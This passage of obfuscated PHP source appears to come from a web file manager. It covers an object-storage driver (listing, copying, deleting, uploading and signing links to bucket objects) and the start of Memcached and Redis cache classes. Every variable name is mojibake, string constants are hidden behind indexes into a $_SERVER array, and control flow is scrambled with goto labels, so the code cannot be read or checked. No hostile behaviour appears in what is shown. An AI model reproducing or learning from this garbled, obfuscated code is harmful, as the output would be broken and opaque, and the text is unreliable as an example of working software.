$d˘‚øÏ∂Ó∂, $fˆ‰ô÷Ë∆Ò); } $cè⁄ùÑÁ—ª = $cè⁄ùÑÁ—ª ? $this->getPathOuter($d˘‚øÏ∂Ó∂) : !1; return $cè⁄ùÑÁ—ª; } public function moveFile($aÍë◊àú¬…, $cßè∞øÒéÖ) { if ($this->copyFile($aÍë◊àú¬…, $cßè∞øÒéÖ)) { $this->delFile($aÍë◊àú¬…); return $this->getPathOuter($cßè∞øÒéÖ); } return !1; } public function delFile($e–«¶¶¶õΩ) { return $this->client->deleteObject($this->bucket, $e–«¶¶¶õΩ); } public function delFolder($C§Úôùêﬂß) { goto B≠Êë–¶ãÒ; Bù›çÑπÊÂ: return $Bô”≈¡äŸÆ === $FÔßÀ‰ñ®º ? !0 : !1; goto b≈ıŒ±ØÖ€; dêé´ú∏ëî: $Bô”≈¡äŸÆ = $FÔßÀ‰ñ®º = 0; $e‘„ÏêóÆÜ = array_chunk(array_keys($Dôêº’¥µ‡), 1000); foreach ($e‘„ÏêóÆÜ as $Cæ™˘‡÷Óπ) { $Bô”≈¡äŸÆ++; $FÔßÀ‰ñ®º += (int) $this->client->deleteObjects($this->bucket, $Cæ™˘‡÷Óπ); } goto Bù›çÑπÊÂ; B≠Êë–¶ãÒ: $FÂèîøªñô =& $_SERVER[—Ω]; $Dôêº’¥µ‡ = $this->listObjs($C§Úôùêﬂß); if (!$Dôêº’¥µ‡) { $C§Úôùêﬂß = trim($C§Úôùêﬂß, $FÂèîøªñô[8]); if (!empty($C§Úôùêﬂß)) { $C§Úôùêﬂß .= $FÂèîøªñô[8]; } return $this->delFile($C§Úôùêﬂß); } goto dêé´ú∏ëî; b≈ıŒ±ØÖ€: } public function rename($Dõ„•ÑæÖ≤, $fóÕË¢¡¨Ω) { return $this->renameObject($Dõ„•ÑæÖ≤, $fóÕË¢¡¨Ω); } public function listPath($b»ÚÚ≥ü€≠, $d™õé£‰§… = false) { $Dñæ≥Êﬁû« =& $_SERVER[—Ω]; $D÷Ô´å≠≠ı = $this->listObjs($b»ÚÚ≥ü€≠, null, null, $Dñæ≥Êﬁû«[8]); $C¥îí√Ãçº = array($Dñæ≥Êﬁû«[74] => array(), $Dñæ≥Êﬁû«[73] => array()); foreach ($D÷Ô´å≠≠ı as $BÆﬂ–á‡àÿ => $aùï¿óï∫’) { if ($BÆﬂ–á‡àÿ == $Dñæ≥Êﬁû«[8]) { continue; } if (isset($aùï¿óï∫’[$Dñæ≥Êﬁû«[183]])) { $C¥îí√Ãçº[$Dñæ≥Êﬁû«[74]][] = $this->folderInfo($aùï¿óï∫’[$Dñæ≥Êﬁû«[183]], $d™õé£‰§…); } else { if (substr($aùï¿óï∫’[$Dñæ≥Êﬁû«[28]], -1) == $Dñæ≥Êﬁû«[8]) { continue; } $C¥îí√Ãçº[$Dñæ≥Êﬁû«[73]][] = $this->fileInfo($aùï¿óï∫’[$Dñæ≥Êﬁû«[28]], $d™õé£‰§…, $aùï¿óï∫’); } } return $C¥îí√Ãçº; } private function fileInfo($E≤äÚŸµ¶ì, $aØΩôâÎÃû = false, $dúôŸÆÛ±ü = array()) { goto E¿ß≈∫¨≠; Eù‘ıŒù±™: if (empty($dúôŸÆÛ±ü)) { $dúôŸÆÛ±ü = $this->objectMeta($E≤äÚŸµ¶ì); if (!$dúôŸÆÛ±ü) { return $f”§í ˆÇï; } } if (isset($dúôŸÆÛ±ü[$aîˆﬁÌø¨ç[187]])) { $f”§í ˆÇï[$aîˆﬁÌø¨ç[107]] = $dúôŸÆÛ±ü[$aîˆﬁÌø¨ç[187]]; } if (isset($dúôŸÆÛ±ü[$aîˆﬁÌø¨ç[77]])) { $f”§í ˆÇï[$aîˆﬁÌø¨ç[77]] = $dúôŸÆÛ±ü[$aîˆﬁÌø¨ç[77]]; } goto BÇ≤ƒ—õı¯; BÇ≤ƒ—õı¯: return $f”§í ˆÇï; goto A≥ç¿ˆó”®; E¿ß≈∫¨≠: $aîˆﬁÌø¨ç =& $_SERVER[—Ω]; if ($aØΩôâÎÃû) { return array($aîˆﬁÌø¨ç[28] => $this->pathThis($E≤äÚŸµ¶ì), $aîˆﬁÌø¨ç[75] => $this->getPathOuter($E≤äÚŸµ¶ì), $aîˆﬁÌø¨ç[29] => $aîˆﬁÌø¨ç[164], $aîˆﬁÌø¨ç[157] => $this->ext($E≤äÚŸµ¶ì), $aîˆﬁÌø¨ç[77] => isset($dúôŸÆÛ±ü[$aîˆﬁÌø¨ç[77]]) ? $dúôŸÆÛ±ü[$aîˆﬁÌø¨ç[77]] : 0, $aîˆﬁÌø¨ç[184] => 0, $aîˆﬁÌø¨ç[107] => 0, $aîˆﬁÌø¨ç[185] => !0, $aîˆﬁÌø¨ç[186] => !0); } $f”§í ˆÇï = array($aîˆﬁÌø¨ç[28] => $this->pathThis($E≤äÚŸµ¶ì), $aîˆﬁÌø¨ç[75] => $this->getPathOuter($E≤äÚŸµ¶ì), $aîˆﬁÌø¨ç[29] => $aîˆﬁÌø¨ç[164], $aîˆﬁÌø¨ç[184] => 0, $aîˆﬁÌø¨ç[107] => 0, $aîˆﬁÌø¨ç[77] => 0, $aîˆﬁÌø¨ç[157] => $this->ext($E≤äÚŸµ¶ì), $aîˆﬁÌø¨ç[185] => !0, $aîˆﬁÌø¨ç[186] => !0); goto Eù‘ıŒù±™; A≥ç¿ˆó”®: } private function folderInfo($CÆ®É◊ßüÇ, $BµäÜùŒ«‹ = false) { goto A•Û¢íº∆í; A•Û¢íº∆í: $AÜíòÑÍËø =& $_SERVER[—Ω]; if ($BµäÜùŒ«‹) { return array($AÜíòÑÍËø[28] => $this->pathThis($CÆ®É◊ßüÇ), $AÜíòÑÍËø[75] => $this->getPathOuter($AÜíòÑÍËø[8] . $CÆ®É◊ßüÇ), $AÜíòÑÍËø[29] => $AÜíòÑÍËø[76], $AÜíòÑÍËø[185] => !0, $AÜíòÑÍËø[186] => !0); } $Eﬂ≠¶ﬂÎﬂ∆ = array($AÜíòÑÍËø[28] => $this->pathThis($CÆ®É◊ßüÇ), $AÜíòÑÍËø[75] => $this->getPathOuter($AÜíòÑÍËø[8] . $CÆ®É◊ßüÇ), $AÜíòÑÍËø[29] => $AÜíòÑÍËø[76], $AÜíòÑÍËø[184] => 0, $AÜíòÑÍËø[107] => 0, $AÜíòÑÍËø[185] => !0, $AÜíòÑÍËø[186] => !0); goto Aè÷ÿ˘Öïæ; eŸÇÚÚêÖ„: if (isset($D„øßÊÈ“õ[$AÜíòÑÍËø[187]])) { $Eﬂ≠¶ﬂÎﬂ∆[$AÜíòÑÍËø[184]] = $D„øßÊÈ“õ[$AÜíòÑÍËø[187]]; } return $Eﬂ≠¶ﬂÎﬂ∆; goto DÂ¡∏Àô“»; Aè÷ÿ˘Öïæ: if ($CÆ®É◊ßüÇ == $AÜíòÑÍËø[33]) { return $Eﬂ≠¶ﬂÎﬂ∆; } $CÆ®É◊ßüÇ = trim($CÆ®É◊ßüÇ, $AÜíòÑÍËø[8]) . $AÜíòÑÍËø[8]; $D„øßÊÈ“õ = $this->objectMeta($CÆ®É◊ßüÇ); goto eŸÇÚÚêÖ„; DÂ¡∏Àô“»: } public function listObjs($BâΩÛ‹›ç, $cîÈﬂ”¯√£ = null, $d©´Ï†ãí¯ = null, $e›ÜÛ“á„è = null) { $c°Ú≥≠Ω„Ú =& $_SERVER[—Ω]; $BâΩÛ‹›ç = trim($BâΩÛ‹›ç, $c°Ú≥≠Ω„Ú[8]); $A√öõÖñ∂« = empty($BâΩÛ‹›ç) ? $c°Ú≥≠Ω„Ú[33] : $BâΩÛ‹›ç . $c°Ú≥≠Ω„Ú[8]; return $this->client->getBucket($this->bucket, $A√öõÖñ∂«, $cîÈﬂ”¯√£, $d©´Ï†ãí¯, $e›ÜÛ“á„è, !0); } public function has($Eõ¢ìöÃ‰Æ, $EûÍ¡ü⁄±“ = false, $cÿ®ÊΩúà¢ = true) { goto F‡ƒàÿÖüú; F‡ƒàÿÖüú: $cƒ•ï »∂Ö =& $_SERVER[—Ω]; $a≈µ∑Ü–¥≠ = 0; $B‡‹ŒóÛÉÂ = 0; goto B±·´ù„πı; B±·´ù„πı: $DêÉ∏ôœîÕ = $this->listObjs($Eõ¢ìöÃ‰Æ, null, null, $cƒ•ï »∂Ö[8]); $DêÉ∏ôœîÕ = is_array($DêÉ∏ôœîÕ) ? $DêÉ∏ôœîÕ : array(); foreach ($DêÉ∏ôœîÕ as $EÀ†ŸØ∞åë) { if (isset($EÀ†ŸØ∞åë[$cƒ•ï »∂Ö[28]]) && substr($EÀ†ŸØ∞åë[$cƒ•ï »∂Ö[28]], -1) != $cƒ•ï »∂Ö[8]) { if (!$EûÍ¡ü⁄±“ && $cÿ®ÊΩúà¢) { return !0; } $a≈µ∑Ü–¥≠++; } else { if (isset($EÀ†ŸØ∞åë[$cƒ•ï »∂Ö[183]])) { if (!$EûÍ¡ü⁄±“ && !$cÿ®ÊΩúà¢) { return !1; } $B‡‹ŒóÛÉÂ++; } } } goto Få÷Ç´Ô“á; Få÷Ç´Ô“á: if ($EûÍ¡ü⁄±“) { return array($cƒ•ï »∂Ö[188] => $a≈µ∑Ü–¥≠, $cƒ•ï »∂Ö[189] => $B‡‹ŒóÛÉÂ); } return !1; goto aÜ§≈≤´∫¿; aÜ§≈≤´∫¿: } public function listAll($B‹¬»Ø‘ªé) { $dˆÕÌé•ÀÜ =& $_SERVER[—Ω]; $Aäå‰Í’ ª = $this->listObjs($B‹¬»Ø‘ªé); $b…é˜ÿ±√÷ = $b©∏ªŸ¢ú„ = array(); foreach ($Aäå‰Í’ ª as $BÉ∏´¢†‰œ => $f•√»ì®à‘) { $b…é˜ÿ±√÷[] = $f•√»ì®à‘[$dˆÕÌé•ÀÜ[28]]; $b©∏ªŸ¢ú„[$BÉ∏´¢†‰œ] = $f•√»ì®à‘[$dˆÕÌé•ÀÜ[77]]; } return $this->listAllFiles($B‹¬»Ø‘ªé, $b…é˜ÿ±√÷, $b©∏ªŸ¢ú„); } public function canRead($a√—¶ùäü√) { $eâ≥…ã Ã˘ =& $_SERVER[—Ω]; $Eıê∆◊ËÚÒ = $this->client->getAccessControlPolicy($this->bucket, $a√—¶ùäü√); if (!$Eıê∆◊ËÚÒ) { return !1; } return in_array($Eıê∆◊ËÚÒ, array($eâ≥…ã Ã˘[190], $eâ≥…ã Ã˘[191], $eâ≥…ã Ã˘[192])) ? !0 : !1; } public function canWrite($A¨µÜâ¡≤) { $aü∏ªƒ◊Üè =& $_SERVER[—Ω]; $fÙ¯Á∆‹Üã = $this->client->getAccessControlPolicy($this->bucket, $A¨µÜâ¡≤); if (!$fÙ¯Á∆‹Üã) { return !1; } return in_array($fÙ¯Á∆‹Üã, array($aü∏ªƒ◊Üè[190], $aü∏ªƒ◊Üè[191])) ? !0 : !1; } public function getContent($d…‚∞Ú£€∂) { return $this->client->getObject($this->bucket, $d…‚∞Ú£€∂); } public function setContent($bÈ∂®πçáÇ, $F·çäè‰êË = '', $aøƒæÕÌ∑ç = false) { goto BêØ≥Èïæ¢; F¥àóÓ£ï¢: $Cè•ÈèüÎ¨ = $this->copyFile($bÈ∂®πçáÇ, $bÈ∂®πçáÇ, array($f⁄”‰ãÈº•[193] => $Cè•ÈèüÎ¨[$f⁄”‰ãÈº•[194]])); return $Cè•ÈèüÎ¨ ? !0 : !1; goto B£ÂÙõÎ€Õ; a´˜ƒœ¢‘ˆ: $Cè•ÈèüÎ¨ = $this->client->putObject($F·çäè‰êË, $this->bucket, $bÈ∂®πçáÇ, $f⁄”‰ãÈº•[182], array(), $fíø⁄•íá÷); if (!$Cè•ÈèüÎ¨) { return !1; } if ($aøƒæÕÌ∑ç) { return !0; } goto F¥àóÓ£ï¢; BêØ≥Èïæ¢: $f⁄”‰ãÈº• =& $_SERVER[—Ω]; $bÈ∂®πçáÇ = $aøƒæÕÌ∑ç ? trim($bÈ∂®πçáÇ, $f⁄”‰ãÈº•[8]) . $f⁄”‰ãÈº•[8] : $bÈ∂®πçáÇ; $fíø⁄•íá÷ = get_file_mime(get_path_ext($bÈ∂®πçáÇ)); goto a´˜ƒœ¢‘ˆ; B£ÂÙõÎ€Õ: } public function fileSubstr($F’†øÕëˆ∞, $aÊõëÎΩ¿ª, $cü¯°”˜œﬁ) { $Bƒ‰Ìœäﬂ√ = $aÊõëÎΩ¿ª + $cü¯°”˜œﬁ - 1; return $this->client->getObject($this->bucket, $F’†øÕëˆ∞, array($_SERVER[—Ω][195] => "\142\x79\x74\x65\x73\75{$aÊõëÎΩ¿ª}\55{$Bƒ‰Ìœäﬂ√}")); } public function upload($C∑âå±ä∏É, $CÚ√πµË∞Ù, $e‡≈›ÃÕè£ = false, $bâŒÔÿûíï = REPEAT_REPLACE) { $Aºâπ ¬ÿü =& $_SERVER[—Ω]; $DàŸπ’ü√ı = array($Aºâπ ¬ÿü[193] => @md5_file($CÚ√πµË∞Ù)); $Dê¶°˘¥éì = array($Aºâπ ¬ÿü[196] => get_file_mime(get_path_ext($C∑âå±ä∏É))); if (IO::size($CÚ√πµË∞Ù) <= 1024 * 1024 * 200) { $d∆ìû∞±àß = $this->client->putObjectFile($CÚ√πµË∞Ù, $this->bucket, $C∑âå±ä∏É, $Aºâπ ¬ÿü[182], $DàŸπ’ü√ı, $Dê¶°˘¥éì); return !empty($d∆ìû∞±àß) ? $this->getPathOuter($C∑âå±ä∏É) : !1; } $FÃâ»ÍÉ˜¯ = $this->client->multiUploadObject($CÚ√πµË∞Ù, $this->bucket, trim($C∑âå±ä∏É, $Aºâπ ¬ÿü[8]), $DàŸπ’ü√ı, $Dê¶°˘¥éì); return $FÃâ»ÍÉ˜¯ ? $this->getPathOuter($C∑âå±ä∏É) : !1; } public function download($Dàˆ„æ¶ŒÒ, $DÜÚÑ®Ú∏¢) { if (!@is_dir($this->pathFather($DÜÚÑ®Ú∏¢)) && !IO::mkdir($this->pathFather($DÜÚÑ®Ú∏¢))) { return !1; } $Fú≠…ÖæÔ™ = $this->client->getObject($this->bucket, $Dàˆ„æ¶ŒÒ, array(), $DÜÚÑ®Ú∏¢); return $Fú≠…ÖæÔ™ !== !1 ? $DÜÚÑ®Ú∏¢ : !1; } public function link($A√¥˘ÆÏ†â, $c≈§–€£ ¿ = array()) { $D¯¬©®çì∫ =& $_SERVER[—Ω]; if ($this->signVer == $D¯¬©®çì∫[197]) { return $this->client->getAuthenticatedURL($this->bucket, $A√¥˘ÆÏ†â, 3600 * 12, $c≈§–€£ ¿); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($A√¥˘ÆÏ†â, $D¯¬©®çì∫[8]), 3600 * 12, $this->region, array(), !0, $c≈§–€£ ¿); } public function fileOut($B≥Ü∞≥Ω´», $f≠Õ¡õà€• = false, $CãÔπ•≠áª = false, $cÑ«∏Ø∆¢  = '') { goto b”´¯∑÷‡; b”´¯∑÷‡: $aéÒﬁøªä§ =& $_SERVER[—Ω]; if (!$CãÔπ•≠áª) { $CãÔπ•≠áª = $this->pathThis($B≥Ü∞≥Ω´»); } $dÔ¨ÑÇÁŸå = get_file_mime(get_path_ext($CãÔπ•≠áª)); goto FÔ·„Ó±Öﬂ; FÔ·„Ó±Öﬂ: if ($dÔ¨ÑÇÁŸå == $aéÒﬁøªä§[198]) { return parent::fileOut($B≥Ü∞≥Ω´», $f≠Õ¡õà€•, $CãÔπ•≠áª, $cÑ«∏Ø∆¢ ); } $f≠Õ¡õà€• = $f≠Õ¡õà€• ? $aéÒﬁøªä§[199] : $aéÒﬁøªä§[200]; $CêÍ◊é’ı† = array($aéÒﬁøªä§[201] => $f≠Õ¡õà€• . $aéÒﬁøªä§[202] . rawurlencode($CãÔπ•≠áª), $aéÒﬁøªä§[203] => $dÔ¨ÑÇÁŸå); goto a≠¶Ú·ƒ¬¨; a≠¶Ú·ƒ¬¨: $BÛµúÙ∫÷â = $this->link($B≥Ü∞≥Ω´», $CêÍ◊é’ı†); $this->fileOutLink($BÛµúÙ∫÷â); goto dí£®÷•µã; dí£®÷•µã: } public function fileOutServer($dî¢ºûÏûØ, $A„µçÀ∑à = false, $d£™ÖÔ–¡Ò = false, $F ÙóÊ∑ñ  = '') { parent::fileOut($dî¢ºûÏûØ, $A„µçÀ∑à, $d£™ÖÔ–¡Ò, $F ÙóÊ∑ñ ); } public function fileOutImage($d¨óπ·œÖ≥, $eÎŸè€Ïè• = 250) { $E´Ÿ‚≈Œº = $this->link($d¨óπ·œÖ≥); $this->fileOutLink($E´Ÿ‚≈Œº); } public function fileOutImageServer($F—¯˘ÉéÀ◊, $e∆ˆÙ™É© = 250) { parent::fileOutImage($F—¯˘ÉéÀ◊, $e∆ˆÙ™É©); } public function hashMd5($D˘““ËÖâù, $FÂÿæŒéµ÷ = '') { $A¢¶øÙ¯›„ =& $_SERVER[—Ω]; $eÔµãéìëÎ = $this->objectMeta($D˘““ËÖâù); if (!$eÔµãéìëÎ) { return !1; } $FÂÿæŒéµ÷ = $FÂÿæŒéµ÷ ? $FÂÿæŒéµ÷ : _get($eÔµãéìëÎ, $A¢¶øÙ¯›„[204]); $FÂÿæŒéµ÷ = $FÂÿæŒéµ÷ ? $FÂÿæŒéµ÷ : _get($eÔµãéìëÎ, $A¢¶øÙ¯›„[194], $A¢¶øÙ¯›„[33]); return $FÂÿæŒéµ÷; } public function uploadFormData($cÍ ÿÎπÑÕ, $fÌÙÊà≤È¨ = 3600) { $DËﬂ£ß§ú≤ =& $_SERVER[—Ω]; $BËÃ£ÖòÊß = $this->pathFather($cÍ ÿÎπÑÕ); $cƒ§â¿œ⁄∆ = $this->client->getHttpUploadPostParams($this->bucket, $BËÃ£ÖòÊß, $DËﬂ£ß§ú≤[182], $fÌÙÊà≤È¨); return array_merge((array) $cƒ§â¿œ⁄∆, array($DËﬂ£ß§ú≤[166] => $this->getHost())); } public function multiUploadFormData($cÇóáõû∂£, $E‹—·»·åÜ = 3600) { $CÊÑîè‡ãû =& $_SERVER[—Ω]; $D∫°ã´ı¶Ü = gmdate($CÊÑîè‡ãû[205]); $fÓïíø•ıã = array(); $eÃ‡‹ñàŸè = $this->client->getUploadId($this->bucket, $cÇóáõû∂£, $fÓïíø•ıã); if (!$eÃ‡‹ñàŸè) { return !1; } return array($CÊÑîè‡ãû[206] => $eÃ‡‹ñàŸè, $CÊÑîè‡ãû[166] => $this->getHost() . $CÊÑîè‡ãû[8] . $this->pathEncode($cÇóáõû∂£), $CÊÑîè‡ãû[207] => $D∫°ã´ı¶Ü, $CÊÑîè‡ãû[89] => $cÇóáõû∂£); } public function multiUploadAuthData($cﬂñ‰√ö∑ë, $c±⁄ç¿ÒÒû = array()) { goto Dëë´ÈÍºÉ; eÆöÎƒ¯Ãô: $E¯øè¶¿ö‰ = array($eåæâÏﬂ„€[209], $eåæâÏﬂ„€[33], $eåæâÏﬂ„€[116], $eåæâÏﬂ„€[33], "\170\55\141\x6d\172\55\x64\141\x74\x65\x3a{$FÖ‰ç∂£èë}", $eåæâÏﬂ„€[8] . $this->bucket . $eåæâÏﬂ„€[8] . $this->pathEncode($A≠‘‰¢áõﬁ) . $a‰›™ì∆í∆); if (strpos($a‰›™ì∆í∆, $eåæâÏﬂ„€[210]) === 0) { $E¯øè¶¿ö‰[0] = $eåæâÏﬂ„€[211]; } if (isset($c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[212]]) && $c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[212]] == $eåæâÏﬂ„€[213]) { $E¯øè¶¿ö‰[0] = $eåæâÏﬂ„€[213]; } goto FîöæÌÀáÍ; dÒøπ‰±òé: if (strpos($a‰›™ì∆í∆, $eåæâÏﬂ„€[210]) === 0) { return array($eåæâÏﬂ„€[217] => $bùÓ£…çëÖ, $eåæâÏﬂ„€[207] => $FÖ‰ç∂£èë); } return $bùÓ£…çëÖ; goto bÊ∫’ˆ¿∏Û; FîöæÌÀáÍ: $a∫êì¿´¡¥ = implode($eåæâÏﬂ„€[214], $E¯øè¶¿ö‰); $Báè¢∫Æﬁˆ = base64_encode(hash_hmac($eåæâÏﬂ„€[215], $a∫êì¿´¡¥, $this->secret, !0)); $bùÓ£…çëÖ = $eåæâÏﬂ„€[216] . $this->accessKey . $eåæâÏﬂ„€[4] . $Báè¢∫Æﬁˆ; goto dÒøπ‰±òé; Dëë´ÈÍºÉ: $eåæâÏﬂ„€ =& $_SERVER[—Ω]; $FÖ‰ç∂£èë = isset($c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[207]]) ? $c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[207]] : gmdate($eåæâÏﬂ„€[205]); $a‰›™ì∆í∆ = isset($c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[157]]) ? $c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[157]] : $eåæâÏﬂ„€[33]; goto C„ÉÒƒâÁ; C„ÉÒƒâÁ: $A≠‘‰¢áõﬁ = $c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[89]]; unset($c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[89]]); if (isset($c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[208]])) { $c±⁄ç¿ÒÒû[$eåæâÏﬂ„€[207]] = $FÖ‰ç∂£èë; return $this->listUploadParts($A≠‘‰¢áõﬁ, $c±⁄ç¿ÒÒû); } goto eÆöÎƒ¯Ãô; bÊ∫’ˆ¿∏Û: } public function listUploadParts($aÁ¬í¨üˆ·, $E“ß¿¥Ö›¨ = array()) { goto E˜˘úõ¿Ãˆ; E˜˘úõ¿Ãˆ: $Eâ˘ˆ⁄ÿÃ¨ =& $_SERVER[—Ω]; $b ‘Ÿ◊–„â = str_replace($Eâ˘ˆ⁄ÿÃ¨[218], $Eâ˘ˆ⁄ÿÃ¨[33], $E“ß¿¥Ö›¨[$Eâ˘ˆ⁄ÿÃ¨[157]]); $bƒóè¥íºŸ = $this->client->listParts($this->bucket, $aÁ¬í¨üˆ·, $b ‘Ÿ◊–„â); goto Fÿ”˜„ë·∏; aê´Ëéæëπ: $BÑ„‹≤ıöÀ = $this->multiUploadAuthData($aÁ¬í¨üˆ·, $E“ß¿¥Ö›¨); if (empty($BÑ„‹≤ıöÀ)) { return !1; } return array($Eâ˘ˆ⁄ÿÃ¨[217] => $BÑ„‹≤ıöÀ, $Eâ˘ˆ⁄ÿÃ¨[207] => $E“ß¿¥Ö›¨[$Eâ˘ˆ⁄ÿÃ¨[207]], $Eâ˘ˆ⁄ÿÃ¨[219] => $bƒóè¥íºŸ); goto bº¥íÎ‚ô˜; Fÿ”˜„ë·∏: if (!$bƒóè¥íºŸ) { return !1; } unset($E“ß¿¥Ö›¨[$Eâ˘ˆ⁄ÿÃ¨[208]], $E“ß¿¥Ö›¨[$Eâ˘ˆ⁄ÿÃ¨[212]]); $E“ß¿¥Ö›¨[$Eâ˘ˆ⁄ÿÃ¨[89]] = $aÁ¬í¨üˆ·; goto aê´Ëéæëπ; bº¥íÎ‚ô˜: } public function getHost() { return parent::getHost() . $_SERVER[—Ω][8] . $this->bucket; } public function size($d›ÙÖÃœç⁄) { $d≥Üù˘¥«Œ = $this->objectMeta($d›ÙÖÃœç⁄); return $d≥Üù˘¥«Œ ? $d≥Üù˘¥«Œ[$_SERVER[—Ω][77]] : 0; } public function info($dö⁄¬™ÚÆŸ) { if ($this->isFolder($dö⁄¬™ÚÆŸ)) { return $this->folderInfo($dö⁄¬™ÚÆŸ); } else { if ($this->isFile($dö⁄¬™ÚÆŸ)) { return $this->fileInfo($dö⁄¬™ÚÆŸ); } } return !1; } public function exist($DÚÇπ ´≤¨) { return $this->isFile($DÚÇπ ´≤¨) || $this->isFolder($DÚÇπ ´≤¨); } public function isFile($eÇ„ÿÙÏ◊Á) { return !$this->isFolder($eÇ„ÿÙÏ◊Á) && $this->objectMeta($eÇ„ÿÙÏ◊Á); } public function isFolder($C•Øâé∞ˆÇ) { return $this->cacheMethod($_SERVER[—Ω][220], $C•Øâé∞ˆÇ); } protected function objectMeta($fçÒıÁÜ å) { return $this->cacheMethod($_SERVER[—Ω][221], $fçÒıÁÜ å); } protected function _objectMeta($EØπﬁ˘ëÂÊ) { $fÑêÁÆ‹°µ =& $_SERVER[—Ω]; $EØπﬁ˘ëÂÊ = rtrim($EØπﬁ˘ëÂÊ, $fÑêÁÆ‹°µ[8]); try { $dÎã…Ÿâ∫ª = $this->client->getObjectInfo($this->bucket, $EØπﬁ˘ëÂÊ); if (!isset($dÎã…Ÿâ∫ª[$fÑêÁÆ‹°µ[204]]) && isset($dÎã…Ÿâ∫ª[$fÑêÁÆ‹°µ[222]])) { $dÎã…Ÿâ∫ª[$fÑêÁÆ‹°µ[204]] = $dÎã…Ÿâ∫ª[$fÑêÁÆ‹°µ[222]]; } } catch (OSS\Core\OssException $aëÙ∑é∏¨ç) { $dÎã…Ÿâ∫ª = !1; } if (!$dÎã…Ÿâ∫ª) { } return $dÎã…Ÿâ∫ª; } protected function _isFolder($DíÙâç•ﬂ¿) { goto B˜  ãï±ñ; bàŸŸä’º§: $dõµéÎÉ≈¨ = $this->client->getBucket($this->bucket, $DíÙâç•ﬂ¿, null, 1); if (empty($dõµéÎÉ≈¨)) { return !1; } $dõµéÎÉ≈¨ = array_values($dõµéÎÉ≈¨); goto Aû´†±ïîã; Aû´†±ïîã: if (substr($dõµéÎÉ≈¨[0][$bû∏çÁƒÂê[28]], -1) == $bû∏çÁƒÂê[8]) { return !0; } if (get_path_this($dõµéÎÉ≈¨[0][$bû∏çÁƒÂê[28]]) == get_path_this($DíÙâç•ﬂ¿)) { return !1; } return !0; goto Eò’∂∆îı¯; B˜  ãï±ñ: $bû∏çÁƒÂê =& $_SERVER[—Ω]; $DíÙâç•ﬂ¿ = rtrim($DíÙâç•ﬂ¿, $bû∏çÁƒÂê[8]); if ($DíÙâç•ﬂ¿ == $bû∏çÁƒÂê[33] || $DíÙâç•ﬂ¿ == $bû∏çÁƒÂê[8]) { return !0; } goto bàŸŸä’º§; Eò’∂∆îı¯: } } define($_SERVER[—Ω][223], 1); goto aî‚ë®ùóî; f¥¬ãıßπ›: define($_SERVER[—Ω][1911], 4); define($_SERVER[—Ω][1912], 5); define($_SERVER[—Ω][1913], 16); goto c◊È·ÕçñÉ; DÁé“äÂ†∑: class CacheLockDatabase { public function lock($bÎ∏Õ«Èû‰, $fÇ…Œæ¥Àã = 0) { $B£ﬂÙçùùÒ = Model($_SERVER[—Ω][765]); $cÀ†»Íã€´ = microtime(!0) + $fÇ…Œæ¥Àã; while (microtime(!0) < $cÀ†»Íã€´) { $e»Ûù¯ŸÍå = $B£ﬂÙçùùÒ->get($bÎ∏Õ«Èû‰); if (!$e»Ûù¯ŸÍå || $e»Ûù¯ŸÍå < microtime(!0)) { $a†·øûÍ—Ë = $B£ﬂÙçùùÒ->set($bÎ∏Õ«Èû‰, $cÀ†»Íã€´); if ($a†·øûÍ—Ë) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($E„Á®»Ü±ˆ) { return Model($_SERVER[—Ω][765])->get($E„Á®»Ü±ˆ); } public function unlock($Fí»ﬁ¡±úﬁ) { Model($_SERVER[—Ω][765])->remove($Fí»ﬁ¡±úﬁ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($b¡éâµƒ∫, $AÈﬂµ—Éáæ) { $dƒÆıï™«≠ =& $_SERVER[—Ω]; if (!class_exists($dƒÆıï™«≠[786])) { show_json($dƒÆıï™«≠[787], !1); } $this->cacheTime = $AÈﬂµ—Éáæ; $this->handle = new Memcached(); if (is_array($b¡éâµƒ∫[$dƒÆıï™«≠[788]]) && count($b¡éâµƒ∫[$dƒÆıï™«≠[788]]) >= 1) { foreach ($b¡éâµƒ∫[$dƒÆıï™«≠[788]] as $C…›ìı•»ê) { $Dèàû€ì˜á = explode($dƒÆıï™«≠[4], $C…›ìı•»ê); $this->handle->addServer($Dèàû€ì˜á[0], $Dèàû€ì˜á[1]); } } else { $this->handle->addServer($b¡éâµƒ∫[$dƒÆıï™«≠[166]], $b¡éâµƒ∫[$dƒÆıï™«≠[167]]); } } public function set($D¨ëÉï„“Ù, $bÿı≈®ã»¬, $d∞ôÎ°™ﬂí = false) { $d∞ôÎ°™ﬂí = $d∞ôÎ°™ﬂí ? $d∞ôÎ°™ﬂí : $this->cacheTime; return $this->handle->set($D¨ëÉï„“Ù, $bÿı≈®ã»¬, $d∞ôÎ°™ﬂí); } public function get($C˘¢¿ÁºÇ‰) { return $this->handle->get($C˘¢¿ÁºÇ‰); } public function remove($b€Î∂πÇºÖ) { return $this->handle->delete($b€Î∂πÇºÖ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($eœõÙàû≈ë, $Fõ·≤ÜÜ°Ë) { $DÆ¶Ÿ≠≠ì√ =& $_SERVER[—Ω]; if (!class_exists($DÆ¶Ÿ≠≠ì√[789])) { show_json($DÆ¶Ÿ≠≠ì√[790], !1); } $this->cacheTime = $Fõ·≤ÜÜ°Ë; $f∫êú§õçè = isset($eœõÙàû≈ë[$DÆ¶Ÿ≠≠ì√[791]]) ? $eœõÙàû≈ë[$DÆ¶Ÿ≠≠ì√[791]] : 10; $bÆÚ≤∫™¡Ë = _get($eœõÙàû≈ë, $DÆ¶Ÿ≠≠ì√[788]); if ($bÆÚ≤∫™¡Ë && is_array($bÆÚ≤∫™¡Ë)) { $this->isCluster = !0; $this->initCluster($eœõÙàû≈ë, $f∫êú§õçè); } else { $this->handle = $this->init($eœõÙàû≈ë, $f∫êú§õçè); } } private function init($e’Õ˜”ıÍº, $D—‡ ‡™ò•) { $DÎ©ø€°ﬂ˘ =& $_SERVER[—Ω]; 